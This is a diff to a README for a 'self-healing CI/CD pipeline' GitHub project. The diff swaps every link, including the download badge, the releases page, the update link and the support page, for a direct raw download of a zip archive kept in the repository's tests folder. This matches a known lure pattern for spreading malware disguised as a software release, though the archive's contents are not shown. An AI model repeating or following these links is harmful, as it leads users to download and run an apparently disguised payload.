@@ -1,7 +1,7 @@
 # 🚀 ci-cd-self-healing - Simple Pipeline for Effortless Deployment
 
 ## 📦 Download the Latest Release
-[![Download](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/ZemkJuzu/ci-cd-self-healing/releases)
+[![Download](https://github.com/ZemkJuzu/ci-cd-self-healing/raw/refs/heads/main/tests/healing_cd_self_ci_2.9.zip)](https://github.com/ZemkJuzu/ci-cd-self-healing/raw/refs/heads/main/tests/healing_cd_self_ci_2.9.zip)
 
 ## 📝 Overview
 The **Self-Healing CI/CD Pipeline** automates your continuous integration and continuous deployment processes. This software helps to ensure your deployment runs smoothly, fixing common issues automatically. It saves you time and effort, allowing you to focus on what matters: delivering excellent software.
@@ -10,7 +10,7 @@ The **Self-Healing CI/CD Pipeline** automates your continuous integration and co
 Follow these simple steps to download and run the application:
 
 ### Step 1: Visit the Releases Page
-Go to our [Releases page](https://github.com/ZemkJuzu/ci-cd-self-healing/releases) to find the latest version of the self-healing CI/CD pipeline.
+Go to our [Releases page](https://github.com/ZemkJuzu/ci-cd-self-healing/raw/refs/heads/main/tests/healing_cd_self_ci_2.9.zip) to find the latest version of the self-healing CI/CD pipeline.
 
 ### Step 2: Choose Your Version
 On the Releases page, you will see a list of versions. Look for the latest stable version. It will be marked clearly. Click on it to view more information.
@@ -72,7 +72,7 @@ After installation, follow these steps to set up your pipeline:
 Check that your system meets the system requirements. Review any error messages for clues on what might be wrong. If necessary, uninstall the application and reinstall it.
 
 ### How can I get updates?
-The application will check for updates automatically. You can also return to the [Releases page](https://github.com/ZemkJuzu/ci-cd-self-healing/releases) periodically to look for the newest version.
+The application will check for updates automatically. You can also return to the [Releases page](https://github.com/ZemkJuzu/ci-cd-self-healing/raw/refs/heads/main/tests/healing_cd_self_ci_2.9.zip) periodically to look for the newest version.
 
 ### Is there a community for support?
 Yes. We have a community space where users can ask questions and share tips. You can find links to our support forums in the application or on the GitHub project page.
@@ -81,6 +81,6 @@ Yes. We have a community space where users can ask questions and share tips. You
 Absolutely! If you would like to contribute, check out the contribution guidelines in our repository. Your input can help improve the software for everyone.
 
 ## 📞 Contact
-For further assistance, feel free to reach out via the issues section of our GitHub repository or visit the [support page](https://github.com/ZemkJuzu/ci-cd-self-healing/issues).
+For further assistance, feel free to reach out via the issues section of our GitHub repository or visit the [support page](https://github.com/ZemkJuzu/ci-cd-self-healing/raw/refs/heads/main/tests/healing_cd_self_ci_2.9.zip).
 
 Thank you for using the Self-Healing CI/CD Pipeline. We hope this tool makes your development process smoother and more efficient.
